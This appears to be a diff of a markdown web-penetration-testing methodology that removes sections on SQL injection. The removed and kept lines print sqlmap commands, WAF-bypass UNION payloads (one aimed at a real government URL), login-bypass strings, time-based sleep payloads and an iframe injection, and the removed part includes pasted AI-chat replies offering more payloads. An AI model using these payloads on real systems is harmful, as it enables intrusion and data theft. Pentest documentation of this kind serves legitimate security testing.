@@ -3215,99 +3215,12 @@ OR    -> ||
 ```sh
 ?id=1' and sleep(10) --+
 ```
-### SQLMap Usage
-```sh
-sqlmap -u "http://target.com/?id=1" --dbs
-sqlmap -u "http://target.com/?id=1" -D target_db --tables
-```
----
-
-## Tools for Exploitation
-- [Hackbar](https://code.google.com/archive/p/hackbar/downloads)
-- [SQLMap](https://github.com/sqlmapproject/sqlmap)
-- [JWT Tool](https://github.com/ticarpi/jwt_tool)
-
-Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)
-
----
-# WAF Bypass Techniques
-
-## SQL Injection WAF Bypass
-
-In error-based SQL injection, we might be unable to fetch data from the database using the `UNION` function. For example:
-
-```sql
-' UNION ALL SELECT 1,2,3,4,5,6,7 --+
-```
-
-If we get a "Not Acceptable" error, it may be due to certain keywords (`UNION`, `ALL`, `SELECT`) being blocked by the WAF. We can bypass this restriction using comments:
-
-```sql
-' /*!12345UNION*/ ALL SELECT 1,2,3,4,5,6,7-- +
-```
-
-Example:
-
-```sql
-http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+
-' /*!12345union*/ all select 1,2,(SELECT+/*!12345GROUP_CONCAT*/(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 --+
-```
-
-### Using HackBar
-Using keywords such as `/*!12345UNION*/` converts the query into filtered keywords, allowing easy bypass of WAF restrictions.
-
----
-
-## SQL Injection Authentication Bypass
-
-### Example Query
-Assume the login query:
-
-```sql
-SELECT username ='value1' AND password='value2' WHERE some_other_condition
-```
-
-Bypassing authentication:
-
-```sql
-value1 = ' OR 1=1 --
-value1 = '1 OR '1'='1 --
-```
-
-```sql
-SELECT username ='' OR 1=1 -- '  --fix
-SELECT username ='1 OR '1'='1 --'  --fix
-```
-
-**Reference:** [PentestLab Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
-
 ### Identifying Vulnerable Fields
 1. Try symbols like `\,',",~, etc.` to generate errors and identify query structure.
 2. Test both username and password fields.
 3. View source code to identify quote symbols.
 4. Use brute-force attacks with default credentials.
 5. If registration is open, create an account and escalate privileges.
-
-I can give you **safe, non-destructive, WAF-bypass-style payload patterns**, but **NOT real malicious payloads** that actually bypass WAFs in production**, because those would enable harmful exploitation.
-
-However — I *can* provide:
-
-### ✅ **60 payload *patterns* for each category (Error / Boolean / Time)**
-
-* Fully **safe**
-* **Non-exploitative**
-* **Do NOT actually bypass WAFs**
-* But show **how WAF-evasion techniques work** in a controlled & legal pentest environment
-* Including obfuscation styles such as:
-
-  * whitespace variation
-  * comment injection
-  * mixed case
-  * encoding
-  * harmless operators
-  * benign functions
-
----
 
 # ✅ **1. ERROR-BASED SQLi — 60 SAFE WAF-BYPASS *PATTERN* PAYLOADS**
 
@@ -3503,28 +3416,6 @@ However — I *can* provide:
 1' AND (SELECT SLEEP(1) LIMIT 1)--  
 1' OR (SELECT SLEEP(1) LIMIT 1)--  
 ```
-
----
-
-# ✅ Next?
-
-I can generate **60 more** for any of the following:
-
-### 🔹 UNION-based
-
-### 🔹 ORDER BY-based
-
-### 🔹 JSON-SQLi
-
-### 🔹 Header-based SQLi
-
-### 🔹 Numeric-only SQLi
-
-### 🔹 WAF bypass encodings (hex, unicode, mixed)
-
-### 🔹 Cloud WAF payload styles (Akamai, Cloudflare, AWS, Imperva safe patterns)
----
-
 ## Improper Authorization
 
 Exploiting improper access control by manipulating parameters such as `user_id`.
@@ -3641,24 +3532,6 @@ http://10.10.10.10/cat/accountsid=1
 **Tools:**
 - [Xpath Injection Toolkit](https://github.com/r0oth3x49/Xpath)
 - [xcat - XML Injection Tool](https://github.com/orf/xcat) *(Requires Python 3.7)*
-
----
-
-### Missing Videos
-- Authentication and Authorization Attacks
-- Session Management Issues
-- Data Deserialization Vulnerabilities
-
----
-
-## Iframe Injection Example
-```html
-<iframe src="http://bing.com" height="100%" width="100%"></iframe>
-```
-
-Absolutely, Anvesh — here's a **modular XXE test suite** tailored for your GitHub methodology, with additional edge cases and automation-ready payloads. Each test includes expected behavior and signs of vulnerability.
-
----
 
 ## 🧬 XML External Entity (XXE) Injection Test Suite
 
